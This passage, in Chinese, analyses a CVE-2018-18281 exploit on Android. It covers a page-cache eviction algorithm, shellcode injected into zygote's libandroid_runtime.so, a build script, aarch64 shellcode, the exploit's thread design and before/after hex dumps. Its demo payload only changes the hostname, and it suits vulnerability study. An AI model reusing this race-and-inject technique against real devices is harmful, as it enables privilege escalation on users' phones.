  * 提高目标位置所在页面的命中率
这个动态库必须是能被高权限进程所使用  
目标位置最好是页面对齐的, 这样目标位置可以以页面为单位加载进内存, 或者以页面为单位置换到硬盘  
目标位置被调用的时机不能太频繁, 要不然修改操作会影响系统稳定性, 而且调用时机必须可以由普通进程触发
下面是一个符合上述条件的动态库和函数:
  * libandroid_runtime.so 动态库
  * com_android_internal_os_Zygote_nativeForkAndSpecialize 函数 
    * 这个函数被 zygote 调用, zygote 进程是一个特权进程
    * 这个函数在 libandroid_runtime.so (pixel2 PQ1A.181105.017.A1) 文件的偏移是 0x157000, 这个偏移是页面对齐的
    * 这个函数一般情况下不会被调用, 只有启动新的 app 时会被 zygote 调用, 可以由普通 app 触发 zygote 去执行
## 利用思路
漏洞触发 race 后, 让释放的物理页面刚好被用于目标页面( libandroid_runtime.so 文件的 offset = 0x157000
这个页面), 再可以通过 UAF 地址注入 shellcode 到目标位置, 从而改写
com_android_internal_os_Zygote_nativeForkAndSpecialize 函数的代码逻辑, 最后发消息触发 zygote
去执行 shellcode
## 如何提高文件 page cache 命中率
这节解决的问题是, 怎么控制 race 释放的页面刚好能被目标页面使用
[这篇论文](https://arxiv.org/pdf/1710.00551.pdf) 的 section VIII-B 介绍了一种算法用于精确控制一个
file page cache 的加载
  * 1) 打开一个大文件 a, mmap 到内存
  * 2) 打开目标文件 b, mmap 到内存
  * 3) 在一个循环内, 执行: 
    * 3.1) 按照 pagesize 逐页面读取 a 的内容 
                   这会导致内核申请大量 page cache 来装载文件 a, 
从而迫使其他文件的 page cache 被置换到硬盘
    * 3.2) 判断目标页面 X 是否在内存里, 如果不是, 跳转到 4.1
  * 4) 在一个循环内, 执行: 
    * 4.1) 按照 pagesize 逐页面读取 b 的内容, 但遇到目标页面 X 则跳过 
                      这会导致目标文件除目标页面 X 之外其他页面被重新装载回内存
    * 4.2) 判断目标页面 X 是否在内存里, 如果是, 跳转到 3.1
  * 5) 如果读取完全部 b 的内容, 目标页面 X 仍然没有在内存里, 结束.
通过上述算法, 可以让一个目标文件的目标页面 X 被置换到硬盘, 而该文件其他页面保留在内存里, 这样在漏洞触发之后, 再来访问目标页面,
则很大机会会分配刚刚释放的物理页面给目标页面
    注意:
    mincore 函数可以用来判断一个区域内的内存是在物理内存中或被交换出磁盘
    上述算法在 linux 的实现依赖于 mincore
## exploit code
我改了一份exploit 代码 [在这里](https://github.com/jiayy/android_vuln_poc-exp/tree/master/EXP-CVE-2018-18281), 主要包含下面几个文件:
  * compile.sh
  * shellcode.s
  * exp.c
  * watchdog.c
###  compile.sh
这是编译脚本
    1) aarch64-linux-gnu-as arm_shellcode.s -o arm_shellcode.o  
    2) aarch64-linux-gnu-ld arm_shellcode.o -o arm_shellcode 
    3) aarch64-linux-gnu-objcopy --dump-section .text=arm_shellcode.bin arm_shellcode 
    4) xxd -i arm_shellcode.bin > arm_shellcode.h 
    5) make
1~3 是将汇编文件 arm_shellcode.s 编译成二进制并将可执行文件的代码段 (.text) 提取到文件 arm_shellcode.bin
4 使用 linux 的 xxd 工具将 arm_shellcode.bin 放进一个 c 语言分格的数组，后续在 c 代码里以数组变量的形式操作它
5 根据 Android.mk 编译可执行文件
## shellcode.s
下面简单看一下 shellcode.s 汇编,不感兴趣可以略过
  * shellcode.s 本身很简单: 读取文件 “/proc/self/attr/current” ，然后将读取的内容作为参数调用 sethostname 函数，从而更改系统的 hostname
  * 因为普通 app 没有权限调用系统函数 ‘sethostname’, 本 exploit 通过注入 shellcode.s 到 libandroid_runtime.so, 然后触发 zygote 进程执行 shellcode.s 达到越权执行的目的
    // open file
    _start:
    mov x0, #-100
    adrp x1, _start
    // NOTE: We are changing the page-relative alignment of the shellcode, so normal
    // aarch64 RIP-relative addressing doesn't work.
    add x1, x1, attr_path-file_start
    mov x2, #0
    mov x8, #0x38
    svc #0
    attr_path:
    .ascii "/proc/self/attr/current"
第一段汇编作用是 open 文件 “/proc/self/attr/current”, #0x38 是系统调用号，对应系统调用 __NR_openat
(系统调用号定义： include/uapi/asm-generic/unistd.h), 将 0x38 放入 x8 寄存器，svc #0
指令触发软中断，进入内核系统调用, 根据 openat 函数的定义, x1 寄存器存放要打开的文件路径的地址, x0 和 x2 这里忽略.
这段汇编执行后，x0寄存器存放返回值，即打开文件的 fd
    // read from file
    sub sp, sp, #128
    mov x1, sp
    mov x2, #128
    mov x8, #0x3f
    svc #0
第二段汇编执行 read 系统调用，读取 128 字节放入栈, #0x3f 对应系统调用 read, x0 存放要读取文件的 fd, x1 是栈顶指针
sp, 在此之前，sp 被移动了#128 字节，相当于一个 128 字节的栈数组作为 buf传给 read 函数第二个参数, x2 是要读取的长度, 这里是
128
这段汇编执行后, sp 指向的位置存放文件 ‘/proc/self/attr/current’ 的内容
    // shove file contents into hostname
    mov x1, x0
    mov x0, sp
    mov x8, #0xa1
    svc #0
第三段汇编执行 sethostname 系统调用, #0xa1 对应系统调用 sethostname, x0 即要更新的域名字符串, 这里放入 sp 指针，
即将上一步 read 函数读取的 buf 值作为 sethostname 的参数 name, x1 是长度, 这里值是上一步read 的返回值
这段汇编执行后, hostname 将被更新为文件 ‘/proc/self/attr/current’ 的内容
## watchdog.c
这个文件的作用是不断调用 exp 可执行文件并监控 exploit 是否成功, 之所以需要这个主调程序是由于这个漏洞在触发的时候,
大部分情况会引发程序奔溃, 这时候需要一个看门狗程序不断重启它
## exp.c
这个文件实现了 exploit 的主体功能
  * kickout_victim_page 函数
  * idle_worker 线程
  * spinner 线程
  * nicer_spinner 线程
  * read_worker 线程
  * segv_handler 函数
kickout_victim_page 函数实现了 如何提高文件 page cache 命中率 的算法, 最开始执行
idle_worker 线程用于触发 mremap 调用, 先绑定到 c1, spinner 唤醒后重绑定 idle_worker 到 c3, 调度策略为
SCHED_IDLE , 其他线程都是普通调度策略
spinner 线程用于触发 fallocate (跟 ftruncate 效果类似) 调用, 绑定到 c2
nicer_spinner 线程绑定到 c3, 用于抢占 idle_worker 的 cpu 使用权
read_worker 线程绑定到 c4, 用于监控目标内存, 一旦发现 race 成功触发, 则注入 shellcode 到目标内存
segv_handler 函数是段错误处理函数, 这里会再一次检测 shellcode 是否已经成功注入到目标文件, 如果是, 则通知 watchdog
停止重启 exp
执行 exploit 之前, libandroid_runtime.so 如下
    adb pull /system/lib64/libandroid_runtime.so
    root@jiayy:CVE-2018-18281# xxd -s 0x157000 -l 100 libandroid_runtime.so 
    00157000: 0871 0091 5f00 08eb c000 0054 e087 41a9  .q.._......T..A.
    00157010: e303 1f32 0800 40f9 0801 43f9 0001 3fd6  ...2..@...C...?.
    00157020: 2817 40f9 a983 5af8 1f01 09eb e110 0054  (.@...Z........T
    00157030: ff03 1191 fd7b 45a9 f44f 44a9 f657 43a9  .....{E..OD..WC.
    00157040: f85f 42a9 fa67 41a9 fc6f c6a8 c003 5fd6  ._B..gA..o...._.
    00157050: f801 00b0 d901 00b0 ba01 00f0 7b02 00f0  ............{...
    00157060: 9c01 0090
执行 exploit 之后, libandroid_runtime.so 如下
    adb pull /system/lib64/libandroid_runtime.so
    root@jiayy:CVE-2018-18281# xxd -s 0x157000 -l 100 libandroid_runtime.so 
    00157000: 0000 20d4 0000 20d4 600c 8092 0100 0090  .. ... .`.......
    00157010: 2120 0191 0200 80d2 0807 80d2 0100 00d4  ! ..............
    00157020: ff03 02d1 e103 0091 0210 80d2 e807 80d2  ................
    00157030: 0100 00d4 e103 00aa e003 0091 2814 80d2  ............(...
    00157040: 0100 00d4 0000 0014 2f70 726f 632f 7365  ......../proc/se
    00157050: 6c66 2f61 7474 722f 6375 7272 656e 7400  lf/attr/current.
    00157060: eaff ff17                                ....
## 引用
  * [mremap TLB flush too late with concurrent ftruncate](https://bugs.chromium.org/p/project-zero/issues/detail?id=1695)
  * [Taking a page from the kernel’s book: A TLB issue in mremap](https://googleprojectzero.blogspot.com/2019/01/taking-page-from-kernels-book-tlb-issue.html)
  * [Swapping and the Page Cache](http://140.120.7.21/LinuxRef/mmLinux/VmOutline/pagecache.html)
  * [patch 讨论](https://lkml.org/lkml/2018/11/2/423)